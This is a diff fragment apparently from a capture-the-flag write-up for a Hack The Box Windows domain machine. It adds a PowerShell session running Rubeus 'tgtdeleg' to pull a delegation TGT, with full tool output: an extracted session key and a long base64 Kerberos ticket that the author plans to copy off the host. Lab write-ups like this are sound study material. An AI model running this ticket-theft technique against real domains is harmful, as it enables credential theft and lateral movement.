@@ -611,7 +611,39 @@ processed file: C:\ProgramData\Rubeus.exe
 Successfully processed 1 files; Failed processing 0 files
 ```
 
-Ill upload rubeus and grant all users full control over the file, ill upload usoi
+Ill upload rubeus and grant all users full control over the file, ill upload using my winrm session to make the upload process easier
+
+```python
+PS C:\ProgramData> .\Rubeus.exe tgtdeleg /nowrap
+.\Rubeus.exe tgtdeleg /nowrap
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3 
+
+
+[*] Action: Request Fake Delegation TGT (current user)
+
+[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
+[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.logging.htb'
+[+] Kerberos GSS-API initialization success!
+[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
+[*] Found the AP-REQ delegation ticket in the GSS-API output.
+[*] Authenticator etype: aes256_cts_hmac_sha1
+[*] Extracted the service ticket session key from the ticket cache: HUraAe+aHynqrgYBuqeoR1/YbkHtOg2lF4BA4ndFAt0=
+[+] Successfully decrypted the authenticator
+[*] base64(ticket.kirbi):
+
+      doIFyDCCBcSgAwIBBaEDAgEWooIEyjCCBMZhggTCMIIEvqADAgEFoQ0bC0xPR0dJTkcuSFRCoiAwHqADAgECoRcwFRsGa3JidGd0GwtMT0dHSU5HLkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuYGHDTJ4vu0s+4IgneDmeEAMxAWNPmsJeaQNHU2QkmUGqmksj6B7rvW5qNV+gocNpok5KWIcBlA70+ntnEzhAPZUrAX/seP2jv8zeJwg6qDZaAOGq8pTnuDdQw178/szf2Qxixqv/BZ9zkLBEakNvvjDthqLt0KubASH/mijSXHMQfBARA+05rF9t/43XzsaWNGxjqpdvFsV8No8MP8AaiREjQMNE55DwIhOppP7HGtPK9BulO/GhY8CLw2ESWMSyFVlaypKVC4bNI+nhnFEwM/opb/H2y//t41xw0NDTVWHVnUMkuVGlQ68PqHvZx2CdeIwzWDP6k55oG/qLVsqW2ObNAyxrVhWOMS47e0i+7YAXiEtM8s8C2H3D5lOloW+zSI/6tv4tyKDGPqDqaIT70tIus5pqhAYIPBrVywr53PE2khGzua5AaHi7NOrKH2cPAxYtIYTEMZbXfM+GgH5CEzSYTFu4rM2P33J5hUBdkkdVJ608ImYBzCeE4LJff+B0NJrm5TVHuf/dQLSk6+jlQHnifpVEJOzPYBYSjEHURa6hi9jt+lMxrQ5qn/9gIA4ib4A+pgghYlyMXrDSRVzlZEI0e4n8/vug+KK0e8po8WhshuMKkbjTWTQXMePLXeJu7tbQ+GwOHdkhlCFipFDwHSQ788ik72zr6M49PhaAZfeoWDJp/4ASwaHHi9vOcSbx5mdPgXOrLDbL0R//BdAss1RIb+DXmKUFUYihd0XjAywQfmRI4G8GhZccVMy/ERdXNABHjkXv9bK0B0R5R71kR0FRoeiWmezZ8fnZFf36U9Ey5fvUAEZmnX4JbFz2zxVyYPnNrIALYdpwbrIJNA1jsvKcI2zg1YVBUNvDPuo8qWwKhYVLc/Bym3qUIZvF6gswK/5/AvLuEj/I0LPcin0XqTLzVyODzpWEAMiw0wfJKjrWhq1wP0OIFQJ2nrL97k3STTSdRwdN8poI4G5j2BBXkqlTixbHBjyiLCp2KNGoEFEpNPpH34W7Sr2Qmi01EZ37VyG12NanR5EdLLi6lizk6MvsfvG42xGpD+g0cJ0QHtXEid3qDxWvHcZzu1dJLiOXjN+OWSTgDCQ6a7SPWJj6tHvOZtLh5otej/ppQbs+uO6cOo6v2SEmUIww/VLt6MxFXuU54ExB/FwGK7xQOKcpdZwZoagGTmX7VB0648oBTYGCmk8QDzPB1/MX7fV12MgxJWDmkHQP15sMbQfdRTEhuQwXCrzWQ0KP/xxb+C6NLhRUoN6XPbrrGTjUY2iFkyTD+e++yH2BQonkBbSvpdoetEnbpjMaHhTTLXY48xLkTDnF5fan62KLq5wMEzV2nOYPOxkODeh+lxhWP1KhTCBLiFYluAHkjPNGfUtyFwPcU/HQpfHVw/lS1Lqrg9GOxs6kgS7mIU6OZBE9dmG0Fyw25aIpf9xnyddqoBicB7PmpSZXLJnn4KhQM3O5vrK28SoO1N7e2SNUgD6NYiqI590atqMY1oddYG4lGQkpGMs5o4HpMIHmoAMCAQCigd4Egdt9gdgwgdWggdIwgc8wgcygKzApoAMCARKhIgQgdh3yxUoFzDwbW1vRe2oFXRGTIut4/78fwAoRH8YeY6ihDRsLTE9HR0lORy5IVEKiGzAZoAMCAQGhEjAQGw5qYXlsZWUuY2xpZnRvbqMHAwUAYKEAAKURGA8yMDI2MTAwODAwMDMwMFqmERgPMjAyNjEwMDgwOTU5MTVapxEYDzIwMjYxMDE0MjM1OTE1WqgNGwtMT0dHSU5HLkhUQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLTE9HR0lORy5IVEI=
+PS C:\ProgramData> 
+```
+
+I now have the kirbi, ill copy this into a file on my machine, making sure its on one line
 
 ```python
 
